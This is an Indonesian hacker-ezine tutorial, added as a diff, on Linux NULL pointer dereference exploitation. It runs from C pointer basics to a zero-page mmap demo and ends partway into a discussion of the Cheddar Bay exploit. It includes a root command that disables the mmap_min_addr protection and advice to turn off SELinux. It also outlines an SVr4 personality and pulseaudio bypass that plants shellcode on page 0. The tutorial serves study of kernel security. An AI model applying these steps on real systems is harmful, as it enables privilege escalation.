@@ -1,0 +1,1777 @@
+                 .::                         .:                   
+   .::       .:::.::        .::    .:::: .::   .:: .::     .::    
+ .:   .::  .::   .: .:    .::  .::      .:: .:: .::  .:: .:   .:: 
+.::::: .::.::    .::  .::.::    .::   .::   .:: .::  .::.::::: .::
+.:         .::   .:   .:: .::  .::   .::    .:: .::  .::.:        
+  .::::      .:::.::  .::   .::    .::::::::.::.:::  .::  .::::   
+  
+ECHO MAGAZINE VOLUME VII, ISSUE XXI, PHILE 0x006.TXT
+
+Null Pointer Dereference: Theory, Bug, eksploit
+Ditulis oleh: Cyberheb < Cyberheb /et/ kecoak-elektronik \dot\ net >
+
+=== // First Words \\===
+
+Setelah tahun lalu bug Dan Kaminsky (bailiwicked dns attack) memunculkan buzz
+dimana-mana, menjelang akhir tahun ini sepertinya bug pada kernel Linux yang
+ramai dibicarakan oleh berbagai pihak. Beragam diskusi menarik seputar
+eksploitasi kernel linux dimulai semenjak Brad Spender merilis eksploit yang
+diberi nama "cheddar bay". Eksploit ini menguak beberapa hal penting yang
+mungkin bagi kalangan security / undergr0und sering disebut sebagai "0day
+technique", dan kemudian dibahas oleh para developer linux, salah satunya dapat
+dilihat pada LWN[1][2].
+
+Eksploitasi pada kernel Linux ini memanfaatkan bug NULL Pointer Dereference,
+walaupun mungkin ada beberapa jenis bug lain yang juga menarik dan muncul ke
+permukaan akhir-akhir ini[3] namun pembahasan kita kali ini terbatas pada jenis
+bug Null Pointer Dereference. Pada artikel ini pembahasan akan dimulai dari
+teori awal hingga mekanisme eksploitasinya dan juga disertai dengan pembahasan
+singkat tentang public eksploit yang beberapa minggu terakhir ini banyak
+digunakan.
+
+Sebelumnya saya tekankan bahwa target sistem operasi pada pembahasan ini adalah
+Linux, yang berarti kernel dari sistem operasi berbasis Linux. Saat tulisan ini
+dibuat, versi stabil terakhir dari kernel linux adalah 2.6.30.5 (v2.6) dan
+2.4.37.5 (v2.4). Seluruh contoh kode dalam artikel ini telah ditest sebelumnya
+menggunakan kernel 2.6.30.3 (distro: Gentoo Linux) dan kernel 2.6.5 (distro:
+SuSe 9 Enterprise). 
+
+Penggunaan kernel dari tree 2.4 tidak dilakukan untuk mempersempit area diskusi
+artikel ini agar tidak melebar terlalu jauh, sehingga uji coba menggunakan
+kernel 2.4 akan diserahkan kepada pembaca :).
+
+
+=== // Pointer & C \\===
+
+Dalam bahasa pemrograman C, pointer merupakan suatu tipe data yang nilainya
+menunjuk lokasi dari suatu nilai dalam memory. Dua istilah penting yang harus
+dipahami terlebih dahulu adalah "Reference" dan "Dereference". Dalam suatu kode
+bahasa C:
+
+/* pointer_memory.c */
+int main(int argc, char *argv[])
+{
+        char huruf;
+        char *p;
+
+        huruf = 'A';
+        p = &huruf;
+        printf("Lokasi variabel huruf dalam memory: %p\n", p);
+        printf("Isi dari variabel huruf adalah: %c\n", *(p));
+        return 0;
+}
+
+
+Pada contoh program diatas, huruf di-inisialisasi sebagai suatu variabel yang
+dapat menyimpan suatu data dalam memory, dalam hal ini tipe data yang dapat
+disimpan adalah 'char' (8 bit). Sedangkan "p" merupakan suatu variable dengan
+tipe data pointer. Program diatas akan memberikan nilai 'A' pada variable
+"huruf" dan memberikan alamat lokasi variable huruf dalam memory pada variable
+"p". Hal ini merupakan teori dasar dalam pemrograman bahasa C.
+
+$ gcc pointer_memory.c -o pointer_memory
+$ ./pointer_memory 
+Lokasi variabel huruf dalam memory: 0xbffff3f7
+Isi dari variabel huruf adalah: A
+
+Dari contoh diatas kita menggunakan variable "p" untuk men-reference dan
+men-dereference variable "huruf". Variable "p" men-reference lokasi variable
+"huruf" dalam memory yang nilainya adalah "0xbffff3f7", dan variable "p"
+men-dereference variable "huruf" yang nilainya adalah "A". 
+
+=========================
+| Memory   |  Nilai     |
+=========================
+0xbffff3f7 |     A      |   variable huruf <---+
+0xbffff3f0 | 0xbffff3f7 |   variable p      ---+ Reference / Dereference
+0xaffff3e7 |            |
+=========================
+
+
+Ilustrasi diatas menunjukan lebih jelas bahwa variable "p" yang berlokasi di
+0xbffff3f0 berisi data 0xbffff3f7 yang merupakan lokasi variable "huruf" dalam
+memory.
+
+Saya harap penjelasan singkat tersebut bisa menjelaskan makna "Reference" dan
+"Dereference" dari suatu tipe data pointer dalam bahasa C. Pemahaman ini sangat
+penting karena akan menjadi dasar pengetahuan hingga akhir artikel.
+
+Berikut ini contoh kode dalam bahasa C yang juga memainkan fungsi pointer:
+
+/* pointer_dereference.c */
+#include <stdio.h>
+
+int main(int argc, char *argv[])
+{
+	char *pointer;
+	char array[5];
+	
+	pointer = array;
+	fprintf(stdout, "[+] pointer = array\n");
+	array[3] = 'A';
+	fprintf(stdout, "[+] array[3] = \'A\'\n");
+	fprintf(stdout, "[+] Pointer dereference *(pointer+3): %c\n",\ 
+                         *(pointer+3));
+
+	return 0;
+	
+}
+
+$ gcc pointer_dereference.c -o pointer_dereference && ./pointer_dereference 
+[+] pointer = array
+[+] array[3] = 'A'
+[+] Pointer dereference *(pointer+3): A
+
+Program diatas menunjukan pointer dereference dari variable "array". Variable
+"array" merupakan suatu variable yang mengalokasikan data sebanyak 5 buah dengan
+tipe char ( 1 byte == 8 bit). Variable "pointer" akan men-reference kan lokasi
+variable "array" dalam memory, hal ini tergantung dari bagaimana kita
+men-reference kan lokasi variable array. Pada contoh diatas, variable "pointer"
+akan menunjuk pada lokasi data pertama variable "array" di-memory.
+
+Untuk mendapatkan data yang berada diposisi ketiga dalam variable array dapat
+memanfaatkan pointer dereference, syntax "*(pointer+3)" digunakan untuk
+kebutuhan tersebut. Angka tiga pada saat men-dereference variable pointer
+merupakan (3 * 1 byte) dari posisi awal variable array, proses ini tergantung
+pada inisialisasi variable pointer dimana pada program diatas bertipe "char" (1
+byte).
+
+Jadi untuk mengakses data "A" diatas bisa melalui 2 cara, yaitu melalui variable
+array secara langsung ataupun melalui derefence dari suatu pointer. Dengan ini
+maka kita sepakat bahwa syntax berikut akan memberikan data yang sama,
+
+array[3] == *(pointer+3) ==> 'A'
+
+Good. Cukup tentang pointer, jika masih ada yang masih belum paham silahkan
+pelajari bahasa C dari beragam referensi di internet.
+
+
+=== // NULL Pointer Dereference \\===
+
+NULL adalah suatu tipe data dalam bahasa C yang menunjukan bahwa suatu nilai
+adalah 'kosong'. Nol (0) tidak sama dengan kosong, nol merupakan suatu nilai.
+NULL banyak dipergunakan untuk beragam keperluan, diantaranya sebagai acuan
+untuk mengakses suatu file dimana akhir dari suatu file di-set NULL, sehingga
+jika suatu program membaca file tersebut dan menemukan NULL maka program
+tersebut akan tahu bahwa sudah mencapai akhir dari file dan berhenti proses
+membaca.
+
+NULL banyak dipergunakan oleh proses yang menggunakan tipe data pointer,
+beberapa contoh yang paling mudah ditemukan adalah aplikasi linked-list. Ujung
+suatu list umumnya diset NULL, dan proses pada list tersebut akan mengetahui
+bahwa akhir suatu list telah ditemukan jika telah mencapai NULL.
+
+NULL pointer dereference adalah suatu kondisi dimana proses akan men-dereference
+suatu pointer yang bernilai NULL. Mari kita lihat 2 contoh sederhana berikut
+ini:
+
+/* #1. dereference_for_null.c */
+#include <stdio.h>
+
+int main(int argc, char *argv[])
+{
+
+        char huruf;
+        char *pointer;
+
+        huruf = NULL;
+        pointer = &huruf;
+        printf("Isi dari huruf adalah: %c\n", *(pointer));
+
+        return 0;
+}
+
+$ gcc dereference_for_null.c -o dereference_for_null && ./dereference_for_null 
+Isi dari huruf adalah: 
+
+---
+/* #2. null_pointer_dereference.c */
+#include <stdio.h>
+
+int main(int argc, char *argv[])
+{
+	char *pointer;
+	
+	pointer = NULL;
+	fprintf(stdout, "[+] pointer = NULL\n");
+	fprintf(stdout, "[+] Pointer\'s dereference *(pointer): \n");
+	fprintf(stdout, "%c", *(pointer));
+
+	return 0;
+	
+}
+
+$ gcc null_pointer_dereference.c -o null_pointer_dereference
+$ ./null_pointer_dereference
+[+] pointer = NULL
+[+] Pointer's dereference *(pointer): 
+Segmentation fault
+
+---
+
+Pada contoh pertama, kita memberikan suatu nilai NULL kedalam suatu variable dan
+melakukan pointer dereference untuk mengakses data tersebut. Saat program
+dijalankan maka tidak memberikan hasil apapun, hal ini disebabkan NULL adalah
+'kosong' dan ketika diakses hasilnya adalah...well, kosong :). 
+
+Pada contoh kedua, terjadi suatu hal menarik. Program tersebut mendefinisikan
+suatu pointer sebagai NULL, dan apa yang terjadi ketika program tersebut
+berusaha untuk men-dereference NULL? "Segmentation fault".
+
+Segmentation fault adalah kondisi dimana sistem operasi akan men-terminate suatu
+aplikasi karena berusaha mengakses  bagian terlarang dari memory. Kondisi ini
+bisa diakibatkan misalnya ketika suatu aplikasi hendak menulis lokasi dimemory
+yang telah diset sebagai "read only", atau berusaha mengakses (execute) bagian
+memory yang telah diset "read write". Segmentation fault pada NULL pointer
+dereference memiliki alasan yang bisa dikatakan sama, dan penjelasan mendetail
+akan diberikan pada sub-bagian berikutnya. Namun yang pasti pada tahap ini kita
+telah memahami bahwa NULL pointer dereference akan mengakibatkan segmentation
+fault dan membuat aplikasi di-terminate (berhenti) oleh sistem operasi. 
+
+
+=== // Zero Page Memory \\===
+
+Setiap sistem operasi di desain berbeda dalam hal menangani NULL pointer
+dereference. Pada kernel Linux, sejak dahulu telah diketahui bahwa NULL pointer
+dereference akan mengacu pada lokasi zero page memory. Dengan kata lain,
+dereference NULL pointer akan mengacu pada lokasi 0x00000000.
+
+Memasuki tahap ini kita membutuhkan pengetahuan mengenai management memory pada
+sistem operasi khususnya Linux. Saya tidak akan memberikan penjelasan terlalu
+mendetail karena akan sangat luas sekali dan keluar dari konteks artikel, namun
+saya akan coba menjelaskan beberapa poin penting disini.
+
+Pada arsitektur intel diperkenalkan istilah virtual memory. Virtual memory
+digunakan karena saat x86 (8086?) baru keluar kapasitas memory yang bisa
+digunakan masih sangat terbatas, sehingga dibutuhkan suatu mekanisme oleh sistem
+operasi agar dapat mengalokasikan memory yang sangat terbatas tersebut untuk
+bisa digunakan oleh banyak program / proses. Oleh sebab itulah digunakan virtual
+memory dimana setiap proses akan merasa layaknya menggunakan physical memory,
+namun sesungguhnya memory tersebut hanyalah bentuk virtual yang diberikan oleh
+sistem operasi untuk kemudian dipetakan ke lokasi memory yang sesungguhnya. 
+
+Management memory menggunakan istilah PAGE, yang merupakan satuan dalam operasi
+memory. Besar PAGE ini tidak sama antar arsitektur (intel, sparc, dll), namun
+untuk Linux yang berjalan diatas arsitektur x86 (intel) besar PAGE ini adalah
+4KB (4,096 bytes).
+
+Suatu program (image, contohnya: ELF untuk Linux, .exe untuk Windows) akan
+di-load oleh sistem operasi kedalam virtual memory ini, besar area virtual
+memory ini menggunakan satuan PAGE dan ditentukan oleh sistem operasi. Setiap
+image akan memiliki informasi yang spesifik (header, code segment, data segment,
+stack segment, dll) dan tugas sistem operasi adalah mengalokasikan informasi
+tersebut kedalam virtual memory, selanjutnya processor akan membaca instruksi
+program satu per satu pada virtual memory untuk menjalankan perintah-perintah
+program tersebut. Processor mengakses physical memory melalui virtual memory
+dengan bantuan page table, dan semua ini adalah tanggung jawab sistem operasi
+untuk menyiapkan semuanya. Penjelasan lebih mendetail dapat mengacu pada artikel
+"The Linux Kernel"[4] bagian memory management.
+
+Jika misalnya suatu program dialokasikan memory sebesar 64KB dengan ukuran PAGE
+sebesar 4KB, maka program tersebut akan memiliki ilustrasi alokasi virtual
+memory sebagai berikut:
+
+
+/* Memory allocation untuk 32-bit */
+
+============
+| Memory   |
+============
+0x00010000 |   <----------- (PAGE * 64)
+0x0000FFFF |   <----------- (PAGE * 63)
+...        |
+0x00001000 |   <----------- (PAGE * 1)
+0x00000000 |   <----------- (PAGE * 0) / Zero Page Memory
+============
+
+Setiap proses / thread akan memiliki virtual memory-nya masing-masing, sehingga
+suatu proses tidak diperbolehkan mengakses virtual memory dari proses lain.
+Dalam sistem operasi Linux, sistem operasi akan mengatur apabila suatu aplikasi
+membutuhkan alokasi memory tambahan, hal ini biasanya dengan menggunakan syscall
+seperti mremap(2).
+
+Cukup tentang teori dasar virtual memory.
+
+Dari ilustrasi diatas kita bisa lihat bahwa lokasi 0x00000000 pada virtual
+memory yang dialokasikan untuk suatu proses disebut juga sebagai Zero Page
+Memory. Jika kita kembali pada masalah NULL pointer dereference diatas, maka
+NULL pointer akan menunjuk pada lokasi tersebut.
+
+Setiap alokasi memory yang diberikan oleh sistem operasi juga memiliki semacam
+hak akses, jadi telah ditentukan apakah memory page tersebut hanya boleh untuk
+dibaca (read), bisa di tulisi (write), bisa di eksekusi (execute), merupakan
+lokasi memory yang bisa digunakan oleh dua buah proses berbeda (shared), dan
+lain sebagainya. Zero Page Memory juga memiliki kriteria ini, itu sebabnya jika
+kita hendak mengakses begitu saja lokasi tersebut dimana telah diset hak akses
+tertentu maka akan terjadi "Segmentation fault".
+
+
+=== // mmap() & mprotect()
+
+Linux memiliki beberapa jenis syscall yang berhubungan dengan memory management,
+diantaranya adalah mmap() dan mprotect(). Dari manual pages mmap():
+
+---
+SYNOPSIS
+       #include <sys/mman.h>
+
+       void *mmap(void *addr, size_t length, int prot, int flags,
+                  int fd, off_t offset);
+
+DESCRIPTION
+       mmap()  creates  a  new  mapping in the virtual address space of the
+calling process.  The starting address for the new mapping is specified in addr.
+The length argument specifies the length of the mapping.
+
+...
+---
+
+syscall mmap() digunakan untuk melakukan memory mapping suatu file ataupun
+object ke virtual memory. Jadi suatu proses dapat memanggil mmap dan kemudian
+melakukan maping suatu object/file ke suatu lokasi di memory, dan melakukan
+beragam aktifitas pada file/object tersebut melalui memory. Sebagaimana yang
+telah didefinisikan, mmap juga sekaligus memberikan informasi protocol dan flags
+dari page memory yang telah di-mapped. Data lengkap mengenai protocol apa saja
+ataupun flags apa saja yang bisa diberikan pada page tersebut bisa dibaca
+melalui manual page lengkap mmap.
+
+---
+SYNOPSIS
+       #include <sys/mman.h>
+
+       int mprotect(const void *addr, size_t len, int prot);
+
+DESCRIPTION
+       mprotect()  changes  protection  for  the  calling  process's  memory
+page(s)  containing  any  part  of  the  address  range  in the interval
+       [addr, addr+len-1].  addr must be aligned to a page boundary.
+---
+
+syscall mprotect() digunakan untuk mengubah hak akses suatu memory page,
+misalnya suatu memory page memiliki hak akses "readonly" maka dengan menggunakan
+mprotect() kita dapat mengubah hak akses tersebut menjadi "read+write".
+
+Saat ini kalian mungkin sudah bisa menebak hubungan antara syscall mmap() /
+mprotect() dengan NULL pointer dereference?!yup, kita dapat mengubah hak akses
+pada zero page memory menggunakan mprotect() ataupun melakukan mapping dengan
+menggunakan mmap() dan memasukan nilai yang kita inginkan ke lokasi zero page
+memory.
+
+Mari kita lihat contoh kode berikut ini:
+
+/* zero_page_null_pointer_dereference.c */
+#include <sys/mman.h>
+#include <stdio.h>
+#include <errno.h>
+
+int main(int argc, char *argv[])
+{
+	char *mem = NULL;
+	char *pointer;
+
+	/* Map lokasi memory NULL (zero page memory) */
+	mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, \
+                   MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
+	if ( mem != NULL) {
+		fprintf(stdout, "[-] Zero page tidak bisa di-mapped: %s\n", \
+                        strerror(errno));
+		return 1;
+	}
+	fprintf(stdout, "[+] Zero page berhasil di-mapped\n");
+	/* Assign lokasi NULL dengan karakter 'A' */
+	mem[0] = 'A';
+	fprintf(stdout, "[+] Assign mem[0] = 'A'\n");
+	pointer = NULL;
+	fprintf(stdout, "[+] Assign pointer = NULL\n");
+	fprintf(stdout, "[+] NULL pointer\'s dereference *(pointer): %c\n", \
+                         *(pointer));	
+	return 0;
+	
+}
+
+
+$ gcc zero_page_null_pointer_dereference.c -o zero_page_null_pointer_dereference
+$ ./zero_page_null_pointer_dereference 
+[+] Zero page berhasil di-mapped
+[+] Assign mem[0] = 'A'
+[+] Assign pointer = NULL
+[+] NULL pointer's dereference *(pointer): A
+
+Program diatas jika dijalankan akan melakukan NULL pointer dereference seperti
+program sebelumnya, namun kali ini kita telah melakukan mapping dengan
+memanfaatkan syscall mmap() untuk memasukan karakter 'A' ke lokasi zero page
+memory. Dan ketika program diatas hendak melakukan NULL pointer dereference
+(melalui fungsi fprintf()) yang secara teori akan mengakses zero page memory,
+maka tidak akan terjadi segmentation fault dan justru sebaliknya program akan
+berjalan dengan baik dan menampilkan karakter 'A'.
+
+Sebelum melangkah lebih jauh, program diatas akan berhasil dijalankan secara
+langsung dengan kondisi kernel linux yang digunakan adalah versi < 2.6.23, jika
+kamu mengalami kegagalan dengan pesan "Zero page tidak bisa di-mapped:
+Permission denied" maka kemungkinan besar kernel yang digunakan adalah versi >=
+2.6.23. Saya akan memberikan penjelasan mengenai penyebab kegagalan ini beberapa
+saat lagi, namun untuk kali ini kamu bisa melakukan perintah berikut (sebagai
+"root"):
+
+# sysctl -w vm.mmap_min_addr=0
+
+setelah melakukan perintah diatas, maka normalnya zero page dapat di-mapped.
+Jika masih terdapat masalah, maka kemungkinan lain adalah sistem operasi yang
+digunakan memiliki settingan SELinux ataupun LSM (Linux Security Module)
+lainnya. Silahkan cari referensi untuk menon-aktifkan konfigurasi tersebut, yang
+pasti pada tahap ini kita hanya melakukan pembuktian bahwa kondisi NULL pointer
+dereference dapat di 'kontrol' melalui userland process.
+
+
+===// Bug, Hacker, Developer \\===
+
+Jika kita mencari melalui google[5] mengenai NULL pointer dereference, maka akan
+banyak sekali laporan tentang bug ini. Pada dasarnya bug tersebut adalah hal
+yang umum bagi programmer dimana penyebabnya adalah kekurangan proses checking
+dalam suatu aplikasi. Programmer yang baik biasanya akan melakukan beragam test
+case terhadap aplikasi miliknya, hal ini dilakukan untuk melihat sejauh mana
+aplikasi tersebut dapat menghandle berbagai situasi yang akan ditemukan pada
+saat digunakan oleh user. Namun biasanya disebabkan oleh aplikasi yang sangat
+kompleks, ataupun dikarenakan berbagai macam alasan lainnya bug jenis ini tidak
+dapat dihindari sekalipun oleh seorang programmer tingkat tinggi. 
+
+Dan oleh para hacker, setiap bug terutama yang melibatkan memory corruption
+seperti ini selalu bisa dimanfaatkan untuk mengambil alih sistem. Hal sederhana
+telah kita lakukan sebelumnya dimana mmap() dapat digunakan untuk mengontrol
+lokasi zero page memory, dan oleh para hacker/cracker bidang security hal
+tersebut dijadikan sebagai pintu masuk untuk mendapatkan akses yang lebih tinggi
+(root?) ataupun merebut sistem.
+
+Mekanisme logisnya sederhana, kita bisa memasukan data apapun kedalam zero page
+memory (shellcode?), sisanya tinggal men-trigger NULL pointer dereference
+sehingga eksekusi akan menuju zero page memory, dan...sistem akan berada dibawah
+kendali kita.
+
+Pada sistem komputer (khususnya intel) terdapat mekanisme untuk memisahkan
+antara kernel process dan userland process. Intel memperkenalkan mekanisme ini
+melalui istilah-istilah seperti 'protected mode' ataupun 'ring'. Intinya, dalam
+hal pembagian resource akan dilakukan pemisahan antara kernel process dan user
+process. Sehingga alokasi memory misalnya, antara kernel dan user process
+dilakukan pemisahan hingga level physical memory secara eksplisit. Dengan
+mekanisme ini resource dari user process tidak akan pernah bisa dicampur aduk
+dengan resource dari kernel process, hal ini akan meningkatkan security sistem
+komputer.
+
+Dari sisi CPU, terdapat mekanisme privilege rings dalam protected mode. CPU
+harus masuk ke "Ring 0" ketika menjalankan instruksi kernel, "Ring 1 / Ring 2"
+ketika menjalankan instruksi device drivers, dan "Ring 3" ketika menjalankan
+instruksi userland process. 
+
+NULL pointer dereference jika terjadi pada user process mungkin tidak akan
+terlalu berbahaya karena seperti yang telah dibahas sebelumnya, zero page yang
+di-kontrol hanya sebatas zero page untuk process user. Namun jika bug NULL
+pointer dereference terdapat pada kernel maka kita dapat mengambil alih sistem
+secara penuh. Inilah yang menjadikan bug NULL pointer dereference berbahaya.
+
+Bug NULL pointer dereference bisa terjadi pada setiap sistem operasi (Windows,
+FreeBSD, OpenBSD, Linux, Solaris, dll), namun setiap sistem operasi memiliki
+strategi masing-masing dalam hal memory management, sehingga eksploitasi
+terhadap NULL pointer dereference pada satu sistem operasi tidak bisa di
+implementasikan begitu saja pada sistem operasi lainnya. Pada tahap inilah kita
+biasa mendengar bahwa suatu sistem operasi di klaim memiliki tingkat security
+yang jauh lebih baik dibandingkan sistem operasi lainnya. Sehingga tidak salah
+jika Theo de Raadt sang founder/developer OpenBSD sering menyombongkan bahwa
+OpenBSD adalah sistem operasi paling aman dan paling sulit untuk di-eksploitasi
+:).
+
+Kembali ke Linux, kernel 2.4 dan 2.6 sendiri memiliki mekanisme yang cukup
+berbeda pada beberapa bagian terutama memory management. Secara teknikal, NULL
+pointer dereference dari bug kernel akan lebih sulit untuk di-eksploitasi pada
+kernel 2.4 dibandingkan kernel 2.6 (linus mengorbankan security untuk performa
+dan feature yang akan bisa diusung oleh kernel 2.6), namun dikarenakan bug NULL
+pointer dereference sangat banyak maka developer kernel Linux menambahkan
+feature sysctl mmap_min_addr untuk Virtual Memori (vm) sejak kernel 2.6.23,
+fungsi dari feature ini adalah untuk me-limit mapping terhadap zero page memory
+oleh user process yang biasanya digunakan oleh para hacker/cracker untuk
+mengambil alih sistem saat memanfaatkan bug NULL pointer dereference.
+
+Feature ini cukup sederhana, kita bisa mendefinisikan sendiri lokasi minimum
+yang bisa digunakan oleh mmap() untuk proses mapping, jadi jika kita definisikan
+mmap_min_addr (yang juga bisa dilihat secara langsung dari file
+/proc/sys/kernel/mmap_min_addr) dengan nilai 64KB (65,536 bytes) maka aplikasi
+user / user process tidak akan diperbolehkan menggunakan mmap() untuk mapping
+lokasi antara 0 hingga 64KB.
+
+# sysctl -w vm.mmap_min_addr=65536 <set agar bernilai 64KB>
+vm.mmap_min_addr = 65536          
+
+Feature ini terbukti dapat mempersulit eksploitasi NULL pointer dereference yang
+memanfaatkan trik mmap().
+
+
+===// Bypass mmap() protection \\===
+
+Para hacker bidang security terus mecari cara untuk melakukan eksploitasi
+terhadap bug NULL pointer dereference, ada beberapa metode yang bisa digunakan
+untuk dapat mengakses zero page memory seperti yang di-presentasikan oleh Gael
+Delalleau[6] pada CanSecWest 2005. Pada presentasi tersebut Gael memaparkan
+implementasi memory allocation Linux serta beberapa sistem operasi lain, dan
+memaparkan berbagai kemungkin yang bisa digunakan untuk mengontrol zero page
+memory. Cara tidak langsung (indirect) misalnya dengan memanfaatkan OOM (Out Of
+Memory) yang secara paksa melakukan alokasi heap besar-besaran sehingga pada
+satu titik alokasi heap akan mengisi zero page memory.
+
+Julien Tinnes dan Tavis Ormandy dari Google Security Team melakukan research dan
+menghasilkan metode-metode untuk bypass proteksi terhadap bug Linux NULL pointer
+dereference. Salah satu metodenya ditulis pada blog julien[7].
+
+Sebagaimana yang tertulis pada blog tersebut, mereka mencoba beragam cara namun
+hampir semua masih bisa ditangani dengan baik oleh LSM (Linux Security Module),
+yang notabene merupakan feature tambahan pada kernel Linux untuk security dan
+salah satu tugasnya adalah melakukan pengecekan terhadap feature mmap_min_addr. 
+
+Ada dua hal penting yang mereka dapatkan untuk bisa melakukan mapping pada zero
+page memory berdasarkan analisis kode kernel linux (2.6.30), yang pertama adalah
+trik personality.
+
+# cat linux/fs/binfmt_elf.c
+
+...
+ 976        if (current->personality & MMAP_PAGE_ZERO) {
+ 977        /* Why this, you ask???  Well SVr4 maps page 0 as read-only,
+ 978           and some applications "depend" upon this behavior.
+ 979           Since we do not have the power to recompile these, we
+ 980           emulate the SVr4 behavior. Sigh. */
+ 981        down_write(&current->mm->mmap_sem);
+ 982        error = do_mmap(NULL, 0, PAGE_SIZE, PROT_READ | PROT_EXEC,
+ 983                        MAP_FIXED | MAP_PRIVATE, 0);
+ 984        up_write(&current->mm->mmap_sem);
+...
+
+Linux menggunakan personality untuk melayani aplikasi user, dan pelayanan dalam
+hal ini adalah linux mendukung lingkungan unix-like variant bagi aplikasi yang
+membutuhkan lingkungan tersebut. Gunananya apa?! tentu saja agar
+aplikasi-aplikasi yang semula dibuat untuk lingkungan non-linux namun masih
+termasuk unix-like variant bisa berjalan diatas linux. Diantara personality yang
+didukung adalah SVr4. 
+
+Jika kita set suatu proses untuk menggunakan personality SVr4, maka kode diatas
+akan dijalankan. Dan dapat kita lihat secara gamblang dari komentar developer
+untuk kode diatas bahwa sistem SVr4 melakukan mapping zero page dengan protocol
+read-only (PROT_READ), dan beberapa aplikasi membutuhkan kondisi tersebut
+sehingga ketika suatu proses di-set untuk menggunakan personality SVr4 secara
+otomatis kernel linux akan melakukan mapping zero page dengan protocol
+read-only.
+
+Namun personality SVr4 tidak dapat melawan aturan feature security check LSM.
+Trik diatas akan digagalkan oleh LSM, seperti apakah aturan LSM untuk default
+security check pada linux dalam hal pemanggilan fungsi mmap()?
+
+Security check dilakukan oleh cap_file_mmap, dimana kode internalnya bisa
+dilihat pada "security/capability.c" (kernel 2.6):
+
+# cat security/capability.c
+...
+ 333 	static int cap_file_mmap(struct file *file, unsigned long reqprot,
+ 334                         unsigned long prot, unsigned long flags,
+ 335                         unsigned long addr, unsigned long addr_only)
+ 336	{
+ 337        if ((addr < mmap_min_addr) && !capable(CAP_SYS_RAWIO))
+ 338                return -EACCES;
+ 339        return 0;
+ 340	}
+...
+
+File capability.c berisi default security module pada kernel linux jika tidak
+ada module lain yang di-load untuk melindungi kernel (mis: SELinux). Fungsi
+cap_file_mmap diatas akan mengatur proses mapping file dengan menggunakan
+syscall mmap(). Dan seperti yang tertulis jelas pada kode tersebut, jika "addr"
+yang dialokasikan nilainya kurang dari "mmap_min_addr" dan "tidak memiliki
+capability CAP_SYS_RAWIO" maka return value-nya adalah "-EACCESS". Pada contoh
+program sebelumnya telah kita lihat bahwa restriction ini akan memberikan pesan
+error "permission denied" (mmap_min_addr di-set lebih dari nol).
+
+Jadi, secara logika suatu proses dengan "CAP_SYS_RAWIO" bisa mem-bypass fungsi
+diatas dan diperbolehkan untuk melakukan mapping zero page memory walaupun
+"mmap_min_addr" di-set lebih besar dari nol.
+
+# cat include/linux/capability.h:
+
+...
+ 234	/* Allow ioperm/iopl access */
+ 235	/* Allow sending USB messages to any device via /proc/bus/usb */
+ 236
+ 237	#define CAP_SYS_RAWIO        17
+...
+
+Berdasarkan capability di Linux, proses yang memiliki "CAP_SYS_RAWIO"
+diperbolehkan untuk mengakses ioperm/iopl yang dalam hal ini setaraf dengan hak
+akses "root". Sehingga kita membutuhkan suatu binary yang didalamnya memanggil
+fungsi setuid root sebelum dijalankan. Julien dan Taviso menemukan pulseaudio.
+Pulseaudio melakukan setuid root ketika dijalankan untuk kemudian me-load
+library yang dibutuhkan melalui parameter "-L". Dan ini adalah aplikasi yang
+sempurna untuk dapat mem-bypass default security diatas.
+
+Dengan memanfaatkan pulseaudio, kita dapat membuat suatu kode yang melakukan set
+personality menjadi SVr4, kemudian memanggil pulseaudio untuk me-load suatu
+module. Saat menjalankan pulseaudio, secara otomatis page 0 akan di map dan
+tentu saja akan berhasil karena pulseaudio telah memiliki akses root sehingga
+cap_file_mmap akan meloloskan hal tersebut. 
+
+Module yang diload oleh pulseaudio pun bisa kita kontrol, dalam hal ini modul
+tersebut berisi eksploit yang didalamnya bisa melakukan beragam hal, diantaranya
+melakukan mprotect() untuk mengubah protocol pada page 0 agar bisa
+read+write+execute (jangan lupa, SVr4 hanya memberikan akses read+execute).
+Selanjutnya page 0 dapat kita tulisi dengan beragam hal seperti shellcode,
+sisanya adalah mencari aplikasi yang vulnerable terhadap NULL pointer
+dereference dan membawa eksekusi ke page 0 untuk kemudian menjalankan shellcode
+tersebut. Game over.
+
+Metode diatas adalah satu dari beragam metode yang digunakan untuk mengontrol
+page 0 dan terbukti bisa mem-bypass restriction pada kernel linux yang
+memanfaatkan feature "mmap_min_addr".
+
+
+===// LSM \\===
+
+Pada pembahasan diatas beberapa kali disebutkan tentang LSM. Linux Security
+Module (LSM) merupakan suatu framework yang dimiliki oleh kernel linux untuk
+mendukung implementasi security pada kernel linux tanpa memprioritaskan
+implementasi dari satu pihak tertentu. Pada tahun 2001 di Linux Kernel Summit,
+NSA memberikan proposal SELinux untuk dimasukan kedalam kernel Linux namun Linus
+Torvalds menolak hal tersebut dengan alasan ada beragam pendekatan security yang
+kala itu muncul ke permukaan namun saling tercerai berai[8]. Linus mengatakan
+bahwa komunitas security seharusnya memiliki standarisasi tersendiri untuk
+mendukung security dalam kernel linux dan tidak saling tercerai berai agar bisa
+dimasukan kedalam kernel linux. Sejak saat itu terbentuk komunitas LSM untuk
+pengembangan framework tersebut. Dan akhirnya LSM diterima untuk kemudian
+dimasukan pada kernel 2.6 tahun 2003.
+
+LSM merupakan suatu framework, dan produknya berupa modul seperti AppArmor,
+SELinux, dan TOMOYO Linux. Namun pada perjalanannya SELinux merupakan produk
+paling banyak digunakan dan paling aktif pengembangannya sehingga seakan-akan
+LSM == SELinux.
+
+Produk security untuk kernel linux yang juga sangat populer adalah
+grsecurity/pax. Grsecurity/PaX tidak termasuk dalam LSM karena menggunakan
+pendekatan yang berbeda untuk meningkatkan security pada kernel Linux. Oleh
+karena itu hingga saat ini Grsecurity/PaX merupakan project independent yang
+tetap banyak digunakan oleh beragam distro (mis: Gentoo Hardened) namun terpisah
+dari LSM, sehingga implementasinya menggunakan mekanisme patch secara manual
+terhadap kernel Linux.
+
+
+===// Cheddar Bay \\===
+
+Brad Spender, sang developer grsecurity pada tanggal 17 July 2009 merilis
+eksploit yang diberi kode cheddar_bay kepada public, salah satunya ke milis
+full-disclosure[9]. Pada saat itu baru saja beredar bug null ptr dereference
+untuk device driver tun. Bug tersebut[10] yang merupakan patch tambahan dari
+Herbert Xu jika dilihat secara langsung pada source kode kernel tidak akan
+kelihatan karena telah dilakukan pengecekan terhadap null pointer dereference,
+namun ternyata ada fakta lain yang cukup mengejutkan yaitu masalah optimisasi
